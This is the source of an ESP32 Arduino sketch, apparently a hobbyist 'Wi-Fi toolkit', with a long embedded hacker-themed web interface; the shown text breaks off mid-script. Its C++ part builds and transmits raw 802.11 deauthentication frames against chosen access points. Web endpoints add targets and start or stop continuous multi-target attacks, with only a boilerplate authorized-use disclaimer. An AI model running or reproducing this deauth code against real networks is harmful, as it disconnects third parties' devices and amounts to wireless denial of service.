// ============================================================================
// 🩸 B A R A — A D V A N C E D  W I - F I  T O O L K I T  F O R  E S P 3 2 🩸
// ============================================================================
// Developed by: Ahmed Nour Ahmed | Qena, Egypt
// Version: 3.0 ULTIMATE EDITION
// Purpose: Professional Wi-Fi penetration testing & network reconnaissance
// Features: Multi-channel deauth, live scanning, captive portal, epic UI
// ============================================================================
// 🔥 WARNING: For educational & authorized testing ONLY. Misuse is illegal.
// ============================================================================

#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>
#include <esp_system.h>

// ==================== ⚙️ CONFIGURATION ====================
const char* AP_SSID = "BARA_HACKING_PORTAL";
const char* AP_PASS = "A7med@Elshab7";
const uint16_t WEB_PORT = 80;
const uint8_t MAX_NETWORKS = 100;
const uint8_t MAX_DEAUTH_TARGETS = 5;

// ==================== 🧠 GLOBAL VARIABLES ====================
DNSServer dnsServer;
AsyncWebServer server(WEB_PORT);

struct DeauthTarget {
    uint8_t mac[6];
    String bssid;
    uint8_t channel;
    bool active;
    unsigned long lastSent;
    uint32_t packetCount;
};

DeauthTarget deauthTargets[MAX_DEAUTH_TARGETS];
bool deauthGlobalActive = false;
unsigned long globalDeauthInterval = 100;
unsigned long lastStatsUpdate = 0;
uint32_t totalPacketsSent = 0;

struct WiFiNetwork {
    String bssid;
    String ssid;
    int32_t rssi;
    uint8_t channel;
    uint8_t encryption;
};

WiFiNetwork scannedNetworks[MAX_NETWORKS];
uint8_t scannedCount = 0;
bool scanInProgress = false;
unsigned long lastScanTime = 0;

// Performance metrics
struct SystemMetrics {
    uint32_t uptime;
    uint32_t freeHeap;
    uint8_t cpuFreq;
    float temperature;
    uint32_t totalScans;
    uint32_t totalDeauthPackets;
} metrics;

// ==================== 📝 LOGGING FUNCTION ====================
void addLog(String message) {
    Serial.println("[BARA] " + message);
}

// ==================== 📡 DEAUTH PACKET STRUCTURE ====================
void sendDeauthFrame(const uint8_t* targetMAC, uint8_t channel) {
    // Set WiFi channel for transmission
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // IEEE 802.11 Deauthentication frame
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,                         // Type/Subtype: Deauthentication
        0x3A, 0x01,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
        targetMAC[0], targetMAC[1], targetMAC[2],
        targetMAC[3], targetMAC[4], targetMAC[5], // Source: Target AP
        targetMAC[0], targetMAC[1], targetMAC[2],
        targetMAC[3], targetMAC[4], targetMAC[5], // BSSID: Target AP
        0x00, 0x00,                         // Fragment & Sequence
        0x07, 0x00                          // Reason: Class 3 frame from non-associated STA
    };
    
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    totalPacketsSent++;
}

// ==================== 📡 ENHANCED WIFI SCAN ====================
String performWiFiScan() {
    if (scanInProgress) {
        return "{\"error\": \"Scan already in progress\"}";
    }
    
    scanInProgress = true;
    addLog("Starting WiFi scan...");
    
    WiFi.mode(WIFI_AP_STA);
    int networksFound = WiFi.scanNetworks(false, true, false, 300);
    
    scannedCount = (networksFound > MAX_NETWORKS) ? MAX_NETWORKS : (networksFound > 0 ? networksFound : 0);
    
    DynamicJsonDocument doc(8192);
    JsonArray networks = doc.to<JsonArray>();
    
    for (int i = 0; i < scannedCount; i++) {
        JsonObject net = networks.createNestedObject();
        net["bssid"] = WiFi.BSSIDstr(i);
        net["ssid"] = WiFi.SSID(i);
        net["rssi"] = WiFi.RSSI(i);
        net["channel"] = WiFi.channel(i);
        net["encryption"] = WiFi.encryptionType(i);
    }
    
    String jsonOutput;
    serializeJson(doc, jsonOutput);
    
    WiFi.mode(WIFI_AP);
    scanInProgress = false;
    metrics.totalScans++;
    lastScanTime = millis();
    
    addLog("Scan complete: " + String(scannedCount) + " networks");
    return jsonOutput;
}

// ==================== 🌐 WEB SERVER HANDLERS ====================
void setupWebInterface() {
    // Main page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // Network scan endpoint
    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
        String scanResults = performWiFiScan();
        request->send(200, "application/json", scanResults);
    });
    
    // Add deauth target
    server.on("/addtarget", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!request->hasParam("bssid") || !request->hasParam("channel")) {
            request->send(400, "text/plain", "Missing parameters");
            return;
        }
        
        String bssid = request->getParam("bssid")->value();
        uint8_t channel = request->getParam("channel")->value().toInt();
        uint16_t interval = request->hasParam("interval") ? 
            request->getParam("interval")->value().toInt() : 100;
        
        // Find empty slot
        int slot = -1;
        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
            if (!deauthTargets[i].active) {
                slot = i;
                break;
            }
        }
        
        if (slot == -1) {
            request->send(400, "text/plain", "Maximum targets reached");
            return;
        }
        
        // Parse MAC address
        int parsed = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &deauthTargets[slot].mac[0], &deauthTargets[slot].mac[1],
            &deauthTargets[slot].mac[2], &deauthTargets[slot].mac[3],
            &deauthTargets[slot].mac[4], &deauthTargets[slot].mac[5]);
        
        if (parsed != 6) {
            request->send(400, "text/plain", "Invalid BSSID format");
            return;
        }
        
        deauthTargets[slot].bssid = bssid;
        deauthTargets[slot].channel = channel;
        deauthTargets[slot].active = false;
        deauthTargets[slot].packetCount = 0;
        deauthTargets[slot].lastSent = 0;
        
        globalDeauthInterval = interval;
        
        addLog("Added target: " + bssid + " on channel " + String(channel));
        request->send(200, "text/plain", "Target added successfully: " + bssid);
    });
    
    // Start deauth attacks
    server.on("/startdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        int activeCount = 0;
        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
            if (deauthTargets[i].bssid.length() > 0) {
                deauthTargets[i].active = true;
                activeCount++;
            }
        }
        
        if (activeCount == 0) {
            request->send(400, "text/plain", "No targets configured");
            return;
        }
        
        deauthGlobalActive = true;
        addLog("DEAUTH ATTACK STARTED - " + String(activeCount) + " targets");
        request->send(200, "text/plain", 
            "Deauth attack started on " + String(activeCount) + " target(s)");
    });
    
    // Stop deauth attacks
    server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        deauthGlobalActive = false;
        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
            deauthTargets[i].active = false;
        }
        addLog("All deauth attacks stopped");
        request->send(200, "text/plain", "All deauth attacks stopped");
    });
    
    // Remove target
    server.on("/removetarget", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!request->hasParam("bssid")) {
            request->send(400, "text/plain", "BSSID parameter required");
            return;
        }
        
        String bssid = request->getParam("bssid")->value();
        bool found = false;
        
        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
            if (deauthTargets[i].bssid == bssid) {
                deauthTargets[i].bssid = "";
                deauthTargets[i].active = false;
                deauthTargets[i].packetCount = 0;
                found = true;
                break;
            }
        }
        
        if (found) {
            addLog("Removed target: " + bssid);
            request->send(200, "text/plain", "Target removed: " + bssid);
        } else {
            request->send(404, "text/plain", "Target not found");
        }
    });
    
    // System metrics
    server.on("/metrics", HTTP_GET, [](AsyncWebServerRequest *request) {
        DynamicJsonDocument doc(2048);
        doc["uptime"] = millis() / 1000;
        doc["freeHeap"] = ESP.getFreeHeap();
        doc["cpuFreq"] = ESP.getCpuFreqMHz();
        doc["totalScans"] = metrics.totalScans;
        doc["totalDeauthPackets"] = totalPacketsSent;
        
        JsonArray targets = doc.createNestedArray("targets");
        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
            if (deauthTargets[i].bssid.length() > 0) {
                JsonObject target = targets.createNestedObject();
                target["bssid"] = deauthTargets[i].bssid;
                target["packets"] = deauthTargets[i].packetCount;
                target["active"] = deauthTargets[i].active;
            }
        }
        
        String jsonOutput;
        serializeJson(doc, jsonOutput);
        request->send(200, "application/json", jsonOutput);
    });
    
    server.begin();
}

// ==================== 🌐 EPIC BLOOD-HACKER HTML INTERFACE ====================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🩸 BARA WIFI TOOLKIT 🩸</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
    <style>
        :root {
            --blood-red: #ff0000;
            --blood-dark: #8b0000;
            --neon-red: #ff0040;
            --neon-purple: #bf00ff;
            --matrix-green: #00ff41;
            --dark-bg: #000000;
            --card-bg: rgba(15, 0, 0, 0.95);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        @keyframes matrixRain {
            0% { transform: translateY(-100%); opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
        
        @keyframes bloodPulse {
            0%, 100% { 
                text-shadow: 0 0 20px var(--blood-red), 0 0 40px var(--blood-red), 0 0 60px var(--blood-dark);
                transform: scale(1);
            }
            50% { 
                text-shadow: 0 0 30px var(--blood-red), 0 0 60px var(--blood-red), 0 0 90px var(--blood-dark), 0 0 120px var(--blood-dark);
                transform: scale(1.02);
            }
        }
        
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        
        @keyframes neonGlow {
            0%, 100% { filter: brightness(1) drop-shadow(0 0 5px var(--neon-red)); }
            50% { filter: brightness(1.3) drop-shadow(0 0 20px var(--neon-red)) drop-shadow(0 0 30px var(--neon-purple)); }
        }
        
        @keyframes scanline {
            0% { top: 0%; }
            100% { top: 100%; }
        }
        
        body {
            background: var(--dark-bg);
            color: var(--blood-red);
            font-family: 'Courier New', 'Consolas', monospace;
            overflow-x: hidden;
            position: relative;
            min-height: 100vh;
        }
        
        /* Matrix Rain Background */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
            opacity: 0.15;
        }
        
        .matrix-col {
            position: absolute;
            top: -100%;
            writing-mode: vertical-rl;
            color: var(--matrix-green);
            font-size: 20px;
            animation: matrixRain linear infinite;
            text-shadow: 0 0 5px var(--matrix-green);
        }
        
        /* Scanline Effect */
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(transparent, var(--neon-red), transparent);
            animation: scanline 8s linear infinite;
            pointer-events: none;
            z-index: 999;
            opacity: 0.3;
        }
        
        /* Blood Drops */
        .blood-drop {
            position: fixed;
            background: radial-gradient(circle, rgba(255,0,0,0.8) 0%, transparent 70%);
            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
            pointer-events: none;
            z-index: 2;
        }
        
        /* Container */
        .container {
            position: relative;
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            z-index: 10;
        }
        
        /* Header */
        header {
            text-align: center;
            margin: 30px 0 40px;
            position: relative;
        }
        
        h1 {
            font-size: 4.5em;
            font-weight: 900;
            color: var(--blood-red);
            letter-spacing: 8px;
            margin-bottom: 10px;
            animation: bloodPulse 3s infinite;
            text-transform: uppercase;
            position: relative;
        }
        
        h1::before {
            content: '🩸';
            position: absolute;
            left: -60px;
            animation: neonGlow 2s infinite;
        }
        
        h1::after {
            content: '🩸';
            position: absolute;
            right: -60px;
            animation: neonGlow 2s infinite;
        }
        
        .subtitle {
            color: var(--neon-red);
            font-size: 1.3em;
            text-shadow: 0 0 10px var(--neon-red);
            margin: 10px 0;
            letter-spacing: 2px;
        }
        
        .version {
            color: var(--matrix-green);
            font-size: 0.9em;
            margin-top: 5px;
            text-shadow: 0 0 5px var(--matrix-green);
        }
        
        /* Cards */
        .card {
            background: var(--card-bg);
            border: 2px solid var(--blood-red);
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            box-shadow: 
                0 0 30px rgba(255, 0, 0, 0.5),
                inset 0 0 20px rgba(255, 0, 0, 0.1);
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                45deg,
                transparent 30%,
                rgba(255, 0, 0, 0.1) 50%,
                transparent 70%
            );
            animation: shine 6s infinite;
        }
        
        @keyframes shine {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .card h2 {
            color: var(--neon-red);
            margin-bottom: 20px;
            font-size: 2em;
            text-shadow: 0 0 15px var(--neon-red);
            display: flex;
            align-items: center;
            gap: 15px;
            position: relative;
            z-index: 1;
        }
        
        /* Grid Layout */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        
        /* Status Bar */
        .status-bar {
            padding: 15px;
            margin: 20px 0;
            border-radius: 10px;
            font-weight: bold;
            text-align: center;
            font-size: 1.2em;
            border: 2px solid var(--blood-red);
            background: rgba(0, 0, 0, 0.9);
            animation: neonGlow 3s infinite;
            position: relative;
            z-index: 1;
        }
        
        .status-idle { color: #aaa; border-color: #555; }
        .status-scanning { color: var(--matrix-green); border-color: var(--matrix-green); }
        .status-attacking { color: var(--blood-red); border-color: var(--blood-red); animation: glitch 0.3s infinite; }
        
        /* Buttons */
        .btn {
            background: linear-gradient(135deg, var(--blood-red), var(--blood-dark));
            color: white;
            border: 2px solid var(--neon-red);
            padding: 14px 28px;
            margin: 8px 5px;
            border-radius: 8px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
            font-size: 16px;
            transition: all 0.3s;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .btn:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .btn:hover {
            background: linear-gradient(135deg, var(--neon-red), var(--blood-red));
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 0 40px rgba(255, 0, 0, 1);
        }
        
        .btn:active {
            transform: translateY(1px) scale(0.98);
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #555, #333);
            border-color: #777;
        }
        
        .btn-stop:hover {
            background: linear-gradient(135deg, #666, #444);
        }
        
        /* Input */
        input[type="text"], input[type="number"], select {
            padding: 14px;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid var(--neon-red);
            border-radius: 8px;
            color: var(--blood-red);
            font-family: inherit;
            font-size: 16px;
            width: 100%;
            max-width: 350px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
            transition: all 0.3s;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: var(--neon-purple);
            box-shadow: 0 0 25px rgba(191, 0, 255, 0.6);
        }
        
        /* Table */
        .table-container {
            overflow-x: auto;
            position: relative;
            z-index: 1;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 50, 50, 0.3);
        }
        
        th {
            color: var(--neon-red);
            font-size: 1.2em;
            text-transform: uppercase;
            background: rgba(255, 0, 0, 0.1);
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        td {
            color: #ffaaaa;
        }
        
        tr {
            transition: all 0.3s;
        }
        
        tr:hover {
            background: rgba(255, 0, 0, 0.15);
            transform: scale(1.01);
        }
        
        /* Signal Strength */
        .signal {
            display: inline-flex;
            gap: 2px;
            align-items: flex-end;
        }
        
        .signal-bar {
            width: 4px;
            background: var(--matrix-green);
            border-radius: 2px;
            box-shadow: 0 0 5px var(--matrix-green);
        }
        
        /* Encryption Badge */
        .enc-badge {
            padding: 4px 10px;
            border-radius: 5px;
            font-size: 0.85em;
            font-weight: bold;
            display: inline-block;
        }
        
        .enc-open { background: #ff4444; color: white; }
        .enc-wep { background: #ff8800; color: white; }
        .enc-wpa { background: #ffaa00; color: black; }
        .enc-wpa2 { background: #44ff44; color: black; }
        
        /* Log Console */
        .log-console {
            height: 300px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.95);
            padding: 15px;
            border: 2px solid var(--matrix-green);
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
            position: relative;
            z-index: 1;
        }
        
        .log-console::-webkit-scrollbar {
            width: 10px;
        }
        
        .log-console::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.5);
        }
        
        .log-console::-webkit-scrollbar-thumb {
            background: var(--blood-red);
            border-radius: 5px;
        }
        
        .log-entry {
            margin: 5px 0;
            padding: 5px;
            border-left: 3px solid transparent;
            animation: slideIn 0.3s;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .log-success { color: #55ff55; border-left-color: #55ff55; }
        .log-error { color: #ff4444; border-left-color: #ff4444; }
        .log-warning { color: #ffaa44; border-left-color: #ffaa44; }
        .log-info { color: #aaaaff; border-left-color: #aaaaff; }
        .log-attack { color: var(--blood-red); border-left-color: var(--blood-red); font-weight: bold; }
        
        /* Metrics Grid */
        .metrics {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .metric-card {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            border: 2px solid var(--neon-red);
            text-align: center;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
            position: relative;
            z-index: 1;
        }
        
        .metric-value {
            font-size: 2.5em;
            font-weight: bold;
            color: var(--blood-red);
            text-shadow: 0 0 20px var(--blood-red);
            margin: 10px 0;
        }
        
        .metric-label {
            color: #aaa;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        /* Target List */
        .target-list {
            max-height: 250px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.8);
            padding: 15px;
            border-radius: 8px;
            border: 2px solid var(--blood-red);
            position: relative;
            z-index: 1;
        }
        
        .target-item {
            background: rgba(139, 0, 0, 0.3);
            padding: 12px;
            margin: 8px 0;
            border-radius: 6px;
            border-left: 4px solid var(--blood-red);
            display: flex;
            justify-content: space-between;
            align-items: center;
            animation: slideIn 0.3s;
        }
        
        .target-info {
            flex: 1;
        }
        
        .target-bssid {
            color: var(--neon-red);
            font-weight: bold;
            font-size: 1.1em;
        }
        
        .target-stats {
            color: #aaa;
            font-size: 0.9em;
            margin-top: 5px;
        }
        
        /* Footer */
        footer {
            text-align: center;
            margin: 50px 0 30px;
            color: var(--blood-red);
            font-size: 1.1em;
            text-shadow: 0 0 10px var(--blood-red);
            position: relative;
            z-index: 1;
        }
        
        /* Loading Spinner */
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 0, 0, 0.3);
            border-radius: 50%;
            border-top-color: var(--blood-red);
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Audio Visualizer */
        .audio-viz {
            display: flex;
            gap: 3px;
            justify-content: center;
            align-items: flex-end;
            height: 40px;
            margin: 10px 0;
        }
        
        .viz-bar {
            width: 5px;
            background: linear-gradient(to top, var(--blood-red), var(--neon-red));
            border-radius: 3px;
            animation: visualize 0.8s ease-in-out infinite alternate;
        }
        
        @keyframes visualize {
            to { height: 100%; }
        }
        
        .viz-bar:nth-child(1) { animation-delay: 0s; height: 20%; }
        .viz-bar:nth-child(2) { animation-delay: 0.1s; height: 40%; }
        .viz-bar:nth-child(3) { animation-delay: 0.2s; height: 60%; }
        .viz-bar:nth-child(4) { animation-delay: 0.3s; height: 80%; }
        .viz-bar:nth-child(5) { animation-delay: 0.4s; height: 60%; }
        .viz-bar:nth-child(6) { animation-delay: 0.5s; height: 40%; }
        .viz-bar:nth-child(7) { animation-delay: 0.6s; height: 20%; }
        
        /* Responsive */
        @media (max-width: 768px) {
            .container { padding: 10px; }
            h1 { font-size: 2.8em; }
            h1::before, h1::after { display: none; }
            .card { padding: 15px; }
            .btn { padding: 10px 20px; font-size: 14px; }
            .metrics { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <!-- Matrix Background -->
    <div class="matrix-bg" id="matrixBg"></div>
    
    <!-- Scanline Effect -->
    <div class="scanline"></div>
    
    <div class="container">
        <!-- Header -->
        <header>
            <h1>BARA TOOLKIT</h1>
            <div class="subtitle">Advanced WiFi Penetration Testing System</div>
            <div class="version">v3.0 ULTIMATE | Developed by Ahmed Nour Ahmed | Qena, Egypt</div>
            <div class="audio-viz">
                <div class="viz-bar"></div>
                <div class="viz-bar"></div>
                <div class="viz-bar"></div>
                <div class="viz-bar"></div>
                <div class="viz-bar"></div>
                <div class="viz-bar"></div>
                <div class="viz-bar"></div>
            </div>
        </header>

        <!-- System Status -->
        <div class="card">
            <h2>⚡ SYSTEM STATUS</h2>
            <div id="status" class="status-bar status-idle">Initializing...</div>
            
            <div class="metrics">
                <div class="metric-card">
                    <div class="metric-label">Uptime</div>
                    <div class="metric-value" id="uptime">0s</div>
                </div>
                <div class="metric-card">
                    <div class="metric-label">Free RAM</div>
                    <div class="metric-value" id="freeHeap">0 KB</div>
                </div>
                <div class="metric-card">
                    <div class="metric-label">Total Scans</div>
                    <div class="metric-value" id="totalScans">0</div>
                </div>
                <div class="metric-card">
                    <div class="metric-label">Deauth Packets</div>
                    <div class="metric-value" id="totalPackets">0</div>
                </div>
            </div>
        </div>

        <!-- Control Panel -->
        <div class="card">
            <h2>🎮 CONTROL PANEL</h2>
            <div style="text-align: center;">
                <button class="btn" onclick="scanNetworks()">🔍 SCAN NETWORKS</button>
                <button class="btn" onclick="toggleDeauthPanel()">⚔️ ATTACK MODE</button>
                <button class="btn btn-stop" onclick="stopAllAttacks()">⏹ EMERGENCY STOP</button>
                <button class="btn" onclick="clearLogs()">🗑️ CLEAR LOGS</button>
            </div>
            
            <div id="deauthPanel" style="display:none; margin-top:25px;">
                <h3 style="color: var(--neon-red); margin-bottom: 15px;">🎯 DEAUTHENTICATION ATTACK</h3>
                <div class="grid">
                    <div>
                        <label style="display:block; margin-bottom:8px; color:#aaa;">Target BSSID:</label>
                        <input type="text" id="targetBssid" placeholder="AA:BB:CC:DD:EE:FF" maxlength="17">
                    </div>
                    <div>
                        <label style="display:block; margin-bottom:8px; color:#aaa;">Channel:</label>
                        <input type="number" id="targetChannel" placeholder="1-13" min="1" max="13">
                    </div>
                    <div>
                        <label style="display:block; margin-bottom:8px; color:#aaa;">Interval (ms):</label>
                        <input type="number" id="attackInterval" value="100" min="50" max="1000">
                    </div>
                </div>
                <div style="margin-top:15px; text-align:center;">
                    <button class="btn" onclick="addDeauthTarget()">➕ ADD TARGET</button>
                    <button class="btn" onclick="startAllAttacks()">🔥 START ALL</button>
                    <button class="btn btn-stop" onclick="stopAllAttacks()">🛑 STOP ALL</button>
                </div>
                
                <h3 style="color: var(--neon-red); margin: 25px 0 15px;">📋 ACTIVE TARGETS</h3>
                <div class="target-list" id="targetList">
                    <div style="text-align:center; color:#666;">No active targets</div>
                </div>
            </div>
        </div>

        <!-- Network Scanner -->
        <div class="card">
            <h2>📡 NETWORK SCANNER (<span id="netCount">0</span> detected)</h2>
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>BSSID</th>
                            <th>SSID</th>
                            <th>SIGNAL</th>
                            <th>CH</th>
                            <th>SECURITY</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody id="networkTable">
                        <tr>
                            <td colspan="6" style="text-align:center; color:#666;">Run a scan to detect networks</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Attack Logs -->
        <div class="card">
            <h2>🩸 ATTACK LOGS & SYSTEM EVENTS</h2>
            <div class="log-console" id="logConsole"></div>
        </div>

        <footer>
            🩸 BARA v3.0 — THE ULTIMATE ESP32 WIFI WEAPON 🩸<br>
            <small>For Authorized Security Testing Only | Unauthorized Use is Illegal</small>
        </footer>
    </div>

    <script>
        // ==================== AUDIO SYSTEM ====================
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        
        function playTone(freq, duration, type = 'sine') {
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.frequency.value = freq;
            osc.type = type;
            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + duration);
            osc.start();
            osc.stop(audioCtx.currentTime + duration);
        }
        
        function playScanSound() {
            playTone(800, 0.1);
            setTimeout(() => playTone(1000, 0.1), 100);
        }
        
        function playAttackSound() {
            playTone(400, 0.15, 'square');
        }
        
        function playSuccessSound() {
            playTone(600, 0.1);
            setTimeout(() => playTone(800, 0.1), 100);
            setTimeout(() => playTone(1000, 0.2), 200);
        }
        
        function playErrorSound() {
            playTone(200, 0.3, 'sawtooth');
        }
        
        // ==================== MATRIX RAIN EFFECT ====================
        function createMatrixRain() {
            const matrixBg = document.getElementById('matrixBg');
            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
            
            for (let i = 0; i < 30; i++) {
                const col = document.createElement('div');
                col.className = 'matrix-col';
                col.style.left = Math.random() * 100 + '%';
                col.style.animationDuration = (Math.random() * 10 + 10) + 's';
                col.style.animationDelay = Math.random() * 5 + 's';
                col.style.fontSize = (Math.random() * 10 + 15) + 'px';
                
                let text = '';
                for (let j = 0; j < 20; j++) {
                    text += chars[Math.floor(Math.random() * chars.length)];
                }
                col.textContent = text;
                matrixBg.appendChild(col);
            }
        }
        
        // ==================== BLOOD DROP EFFECT ====================
        function createBloodDrop() {
            const drop = document.createElement('div');
            drop.className = 'blood-drop';
            drop.style.left = Math.random() * 100 + 'vw';
            drop.style.width = (Math.random() * 30 + 20) + 'px';
            drop.style.height = drop.style.width;
            drop.style.top = '-50px';
            drop.style.animation = `fall ${Math.random() * 5 + 8}s linear`;
            document.body.appendChild(drop);
            
            setTimeout(() => drop.remove(), 15000);
        }
        
        setInterval(() => {
            if (Math.random() > 0.6) createBloodDrop();
        }, 800);
        
        // ==================== LOG SYSTEM ====================
        const logs = [];
        const MAX_LOGS = 200;
        
        function addLog(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            logs.push({ time: timestamp, msg: message, type: type });
            if (logs.length > MAX_LOGS) logs.shift();
            renderLogs();
            
            // Play sound based on type
            if (type === 'attack') playAttackSound();
            else if (type === 'success') playSuccessSound();
            else if (type === 'error') playErrorSound();
        }
        
        function renderLogs() {
            const console = document.getElementById('logConsole');
            console.innerHTML = logs.map(l => 
                `<div class="log-entry log-${l.type}">[${l.time}] ${l.msg}</div>`
            ).join('');
            console.scrollTop = console.scrollHeight;
        }
        
        function clearLogs() {
            logs.length = 0;
            renderLogs();
            addLog('Logs cleared', 'info');
        }
        
        // ==================== STATUS MANAGEMENT ====================
        function updateStatus(message, statusClass = 'status-idle') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = 'status-bar ' + statusClass;
        }
        
        // ==================== NETWORK SCANNING ====================
        let scanning = false;
        
        async function scanNetworks() {
            if (scanning) {
                addLog('Scan already in progress!', 'warning');
                return;
            }
            
            scanning = true;
            updateStatus('🔍 SCANNING NETWORKS... PLEASE WAIT', 'status-scanning');
            addLog('Starting network scan...', 'info');
            playScanSound();
            
            try {
                const response = await fetch('/scan');
                const networks = await response.json();
                renderNetworks(networks);
                updateStatus(`✅ SCAN COMPLETE — ${networks.length} NETWORKS DETECTED`, 'status-idle');
                addLog(`Scan complete: ${networks.length} networks found`, 'success');
                playSuccessSound();
            } catch (error) {
                updateStatus('❌ SCAN FAILED', 'status-idle');
                addLog('Scan error: ' + error.message, 'error');
                playErrorSound();
            } finally {
                scanning = false;
            }
        }
        
        function renderNetworks(networks) {
            const tbody = document.getElementById('networkTable');
            const countEl = document.getElementById('netCount');
            tbody.innerHTML = '';
            countEl.textContent = networks.length;
            
            if (networks.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#666;">No networks found</td></tr>';
                return;
            }
            
            networks.forEach(net => {
                const row = tbody.insertRow();
                
                // BSSID
                const bssidCell = row.insertCell();
                bssidCell.textContent = net.bssid;
                bssidCell.style.fontWeight = 'bold';
                
                // SSID
                const ssidCell = row.insertCell();
                ssidCell.textContent = net.ssid || '⚠️ HIDDEN';
                ssidCell.style.color = net.ssid ? '#ffaaaa' : '#ff6666';
                
                // Signal Strength
                const signalCell = row.insertCell();
                const signalBars = getSignalBars(net.rssi);
                signalCell.innerHTML = `<div class="signal">${signalBars}</div> ${net.rssi} dBm`;
                
                // Channel
                const channelCell = row.insertCell();
                channelCell.textContent = net.channel;
                
                // Encryption
                const encCell = row.insertCell();
                encCell.innerHTML = getEncryptionBadge(net.encryption);
                
                // Action
                const actionCell = row.insertCell();
                const btn = document.createElement('button');
                btn.className = 'btn';
                btn.textContent = '🎯 TARGET';
                btn.style.padding = '8px 16px';
                btn.style.margin = '0';
                btn.onclick = () => selectTarget(net);
